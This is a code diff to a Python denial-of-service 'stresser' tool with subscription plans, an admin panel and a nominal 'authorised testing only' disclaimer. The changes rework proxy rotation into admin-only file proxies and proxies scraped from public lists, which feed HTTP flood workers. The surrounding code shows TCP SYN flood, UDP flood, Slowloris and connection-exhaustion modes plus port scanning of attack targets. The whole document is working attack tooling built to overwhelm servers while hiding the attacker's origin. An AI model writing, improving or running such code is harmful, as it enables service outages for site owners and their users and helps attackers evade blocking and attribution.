@@ -5,7 +5,7 @@
     │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (final multiprocessing fix)
+    Author: bob (admin-only file proxies, public optional)
     Legal: For authorised testing only.
 """
 
@@ -362,11 +362,16 @@ USER_AGENTS = [
 ]
 
 # ================== PROXY MANAGEMENT ==================
-proxies_enabled = False
-proxy_list = []                # list of validated proxy URLs
-proxy_lock = asyncio.Lock()    # to safely update the list during attack
+proxies_enabled = False           # master switch: if True, we attempt to use proxies from the active source
+file_proxies_enabled = False      # admin-only: use file proxies
+public_proxies_enabled = False    # anyone: use public proxies (fetched from web)
+
+file_proxies = []                 # proxies loaded from file (admin only)
+public_proxies = []                # proxies fetched from public sources
+proxy_lock = asyncio.Lock()        # to safely update proxy lists
+
 last_proxy_refresh = 0
-PROXY_REFRESH_INTERVAL = 300   # seconds
+PROXY_REFRESH_INTERVAL = 300       # seconds
 
 def parse_proxy_line(line):
     """Parse a proxy line which can be:
@@ -392,8 +397,9 @@ def parse_proxy_line(line):
     else:
         return None
 
-def load_proxies(file_path="proxies.txt"):
-    global proxy_list
+def load_file_proxies(file_path="proxies.txt"):
+    """Load proxies from file (admin only)."""
+    global file_proxies
     try:
         with open(file_path, 'r') as f:
             lines = f.readlines()
@@ -402,14 +408,14 @@ def load_proxies(file_path="proxies.txt"):
             url = parse_proxy_line(line)
             if url:
                 new_proxies.append(url)
-        proxy_list = new_proxies
-        print(f"  Loaded {len(proxy_list)} proxies from {file_path}")
+        file_proxies = new_proxies
+        print(f"  Loaded {len(file_proxies)} proxies from {file_path}")
     except FileNotFoundError:
-        print(f"  {file_path} not found. Using no proxies.")
-        proxy_list = []
+        print(f"  {file_path} not found.")
+        file_proxies = []
     except Exception as e:
         print(f"  Error loading proxies: {e}")
-        proxy_list = []
+        file_proxies = []
 
 async def fetch_proxies_from_source(source_url, proxy_type='http'):
     """Fetch proxies from a given source URL with timeout."""
@@ -431,7 +437,7 @@ async def fetch_proxies_from_source(source_url, proxy_type='http'):
         return []
 
 async def fetch_proxies_from_multiple_sources():
-    """Gather proxies from various public sources with concurrency limit."""
+    """Gather proxies from various public sources."""
     sources = [
         ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all', 'http'),
         ('https://www.proxy-list.download/api/v1/get?type=http', 'http'),
@@ -448,25 +454,31 @@ async def fetch_proxies_from_multiple_sources():
             all_proxies.extend(res)
     return list(set(all_proxies))
 
-async def refresh_proxy_list(force=False):
-    """Fetch and update proxy list in background."""
-    global proxy_list, last_proxy_refresh
+async def refresh_public_proxies(force=False):
+    """Fetch and update public proxy list in background."""
+    global public_proxies, last_proxy_refresh
     now = time.time()
     if not force and (now - last_proxy_refresh) < PROXY_REFRESH_INTERVAL:
         return
-    print(f"{current_color}[*] Refreshing proxy list in background...{RESET}")
+    print(f"{current_color}[*] Refreshing public proxy list in background...{RESET}")
     raw_proxies = await fetch_proxies_from_multiple_sources()
     if raw_proxies:
         async with proxy_lock:
-            proxy_list = raw_proxies
+            public_proxies = raw_proxies
             last_proxy_refresh = now
-        print(f"{current_color}[+] Proxy list updated: {len(proxy_list)} proxies.{RESET}")
+        print(f"{current_color}[+] Public proxy list updated: {len(public_proxies)} proxies.{RESET}")
     else:
-        print(f"{current_color}[!] No proxies fetched, keeping old list ({len(proxy_list)} proxies).{RESET}")
+        print(f"{current_color}[!] No public proxies fetched, keeping old list ({len(public_proxies)} proxies).{RESET}")
 
 def get_random_proxy():
-    if proxy_list:
-        return random.choice(proxy_list)
+    """Return a random proxy from the currently active source, or None."""
+    if not proxies_enabled:
+        return None
+    # Priority: file proxies if enabled and admin
+    if admin_mode and file_proxies_enabled and file_proxies:
+        return random.choice(file_proxies)
+    elif public_proxies_enabled and public_proxies:
+        return random.choice(public_proxies)
     return None
 
 # ================== USER AGENT & BYPASS UTILS ==================
@@ -551,11 +563,7 @@ async def http_worker(session, url, end_time, worker_id, method, req_counter, er
             start = time.perf_counter()
             
             # Choose proxy if enabled
-            proxy = None
-            if proxies_enabled:
-                async with proxy_lock:
-                    if proxy_list:
-                        proxy = random.choice(proxy_list)
+            proxy = get_random_proxy()
             
             # Build request URL with optional random path
             request_url = url
@@ -690,7 +698,6 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
             errs = err_counter.value
             rps = reqs / elapsed if elapsed > 0 else 0
             avg_latency = 0
-            # latency_list is a manager.list, convert to normal list for sum
             if len(latency_list) > 0:
                 avg_latency = sum(latency_list) / len(latency_list) * 1000
             codes = sorted(status_dict.items(), key=lambda x: x[1], reverse=True)[:5]
@@ -704,8 +711,9 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
             print(f"{current_color}  Time: {RESET}{elapsed:.1f}s / {duration}s")
             print(f"{current_color}  Proxies: {RESET}{'Enabled' if proxies_enabled else 'Disabled'}")
             if proxies_enabled:
-                async with proxy_lock:
-                    print(f"{current_color}  Proxy count: {RESET}{len(proxy_list)}")
+                active_source = "File (admin)" if (admin_mode and file_proxies_enabled and file_proxies) else "Public" if public_proxies_enabled else "None"
+                count = len(file_proxies) if (admin_mode and file_proxies_enabled) else len(public_proxies) if public_proxies_enabled else 0
+                print(f"{current_color}  Proxy source: {RESET}{active_source} ({count})")
             print(f"\n{current_color}{BOLD}  Performance Metrics:{RESET}")
             print(f"    Requests: {reqs:,}")
             print(f"    Errors: {errs:,}")
@@ -721,7 +729,6 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
     except KeyboardInterrupt:
         print(f"\n\n{current_color}attack interrupted.{RESET}")
     finally:
-        # Terminate processes
         for p in processes:
             p.terminate()
         for p in processes:
@@ -827,7 +834,6 @@ def port_scan_worker(target_ip, worker_id, end_time, req_counter, err_counter, p
 
 async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req_counter, err_counter, ports_hit_list, conn_counter):
     """Run Layer 4 attack using thread pool."""
-    # Determine target ports
     target_ports = []
     if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
         port_input = input(f"  Target port(s) (e.g., 80,443, or range 1-1024) → ").strip()
@@ -839,7 +845,6 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name, req
         else:
             target_ports = [int(port_input)]
     
-    # Map method to worker function
     worker_func = None
     if method == 'TCP SYN FLOOD':
         worker_func = tcp_syn_flood_worker
@@ -1005,8 +1010,9 @@ async def run_load_test(req_counter, err_counter, status_dict, latency_list, por
     except:
         duration = min(60, max_duration)
 
-    if not is_layer4 and proxies_enabled:
-        asyncio.create_task(refresh_proxy_list(force=True))
+    # Start public proxy refresh in background if enabled
+    if not is_layer4 and public_proxies_enabled:
+        asyncio.create_task(refresh_public_proxies(force=True))
 
     print(f"\n{current_color}{BOLD}Starting attack...{RESET}")
     print(f"  Plan: {plan_name}")
@@ -1018,8 +1024,12 @@ async def run_load_test(req_counter, err_counter, status_dict, latency_list, por
     print(f"  Workers: {workers}")
     print(f"  Duration: {duration}s")
     if not is_layer4 and proxies_enabled:
-        async with proxy_lock:
-            print(f"  Proxies: Enabled ({len(proxy_list)} loaded initially)")
+        if admin_mode and file_proxies_enabled and file_proxies:
+            print(f"  Proxies: File (admin) – {len(file_proxies)} loaded")
+        elif public_proxies_enabled:
+            print(f"  Proxies: Public – {len(public_proxies)} available")
+        else:
+            print(f"  Proxies: Enabled but no source active")
     elif is_layer4:
         print(f"  Proxies: Not used for Layer 4")
     else:
@@ -1165,7 +1175,6 @@ def reconnaissance_menu(req_counter, err_counter, ports_hit_list, conn_counter):
         print(f"\n  Found {len(open_ports)} open ports.")
         input("  Press ENTER...")
     elif choice == '4':
-        # Attack discovered ports
         target = input("  Target IP → ").strip()
         try:
             socket.inet_aton(target)
@@ -1428,40 +1437,62 @@ def change_ascii_menu():
         time.sleep(1)
 
 async def proxy_settings():
-    global proxies_enabled
+    global proxies_enabled, file_proxies_enabled, public_proxies_enabled
     clear_screen()
     print(f"{current_color}{BOLD}╔══ PROXY SETTINGS ══╗{RESET}\n")
-    print(f"  Proxies: {'Enabled' if proxies_enabled else 'Disabled'}")
-    async with proxy_lock:
-        count = len(proxy_list)
-    print(f"  Proxies loaded: {count}")
+    print(f"  Master switch: {'ON' if proxies_enabled else 'OFF'}")
+    print(f"  File proxies (admin only): {'ENABLED' if file_proxies_enabled else 'DISABLED'} – {len(file_proxies)} loaded")
+    print(f"  Public proxies: {'ENABLED' if public_proxies_enabled else 'DISABLED'} – {len(public_proxies)} available")
     print("\n  Options:")
-    print("  [1] Toggle proxies on/off")
-    print("  [2] Refresh proxy list now (fetch from web)")
-    print("  [3] Clear proxy list")
-    print("  [4] Load proxies from file (proxies.txt)")
+    print("  [1] Toggle master proxy switch")
+    print("  [2] Load proxies from file (Webshare) [ADMIN ONLY]")
+    print("  [3] Toggle file proxies (admin only)")
+    print("  [4] Toggle public proxy fetching")
+    print("  [5] Refresh public proxies now")
+    print("  [6] Clear all proxy lists")
     print("  [0] Back")
+    print()
+    choice = input(f"  {current_color}{BOLD}Select → {RESET}").strip()
     
-    choice = input(f"\n  Select → ").strip()
     if choice == '1':
         proxies_enabled = not proxies_enabled
-        print(f"  Proxies now {'enabled' if proxies_enabled else 'disabled'}.")
-        if proxies_enabled:
-            asyncio.create_task(refresh_proxy_list(force=True))
+        print(f"  Master proxy switch now {'ON' if proxies_enabled else 'OFF'}.")
         time.sleep(1)
     elif choice == '2':
-        asyncio.create_task(refresh_proxy_list(force=True))
-        print("  Proxy refresh started in background.")
-        time.sleep(1)
+        if not admin_mode:
+            print("  Only admin can load file proxies.")
+            time.sleep(2)
+            return
+        file = input("  Proxy file path (default: proxies.txt) → ").strip() or "proxies.txt"
+        load_file_proxies(file)
+        time.sleep(2)
     elif choice == '3':
-        async with proxy_lock:
-            proxy_list.clear()
-        print("  Proxy list cleared.")
+        if not admin_mode:
+            print("  Only admin can toggle file proxies.")
+            time.sleep(2)
+            return
+        file_proxies_enabled = not file_proxies_enabled
+        print(f"  File proxies now {'ENABLED' if file_proxies_enabled else 'DISABLED'}.")
         time.sleep(1)
     elif choice == '4':
-        file = input("  Proxy file path (default: proxies.txt) → ").strip() or "proxies.txt"
-        load_proxies(file)
+        public_proxies_enabled = not public_proxies_enabled
+        print(f"  Public proxy fetching now {'ENABLED' if public_proxies_enabled else 'DISABLED'}.")
+        if public_proxies_enabled:
+            asyncio.create_task(refresh_public_proxies(force=True))
+        time.sleep(1)
+    elif choice == '5':
+        if public_proxies_enabled:
+            asyncio.create_task(refresh_public_proxies(force=True))
+            print("  Public proxy refresh started in background.")
+        else:
+            print("  Public proxy fetching is disabled. Enable it first.")
         time.sleep(2)
+    elif choice == '6':
+        async with proxy_lock:
+            file_proxies.clear()
+            public_proxies.clear()
+        print("  All proxy lists cleared.")
+        time.sleep(1)
     else:
         return
 
@@ -1474,6 +1505,8 @@ def admin_login():
         logout = input("  Logout? (y/n) → ").strip().lower()
         if logout in ['y', 'yes']:
             admin_mode = False
+            # Optionally disable file proxies on logout
+            file_proxies_enabled = False
             print("  Logged out.")
         else:
             print("  Staying in admin mode.")
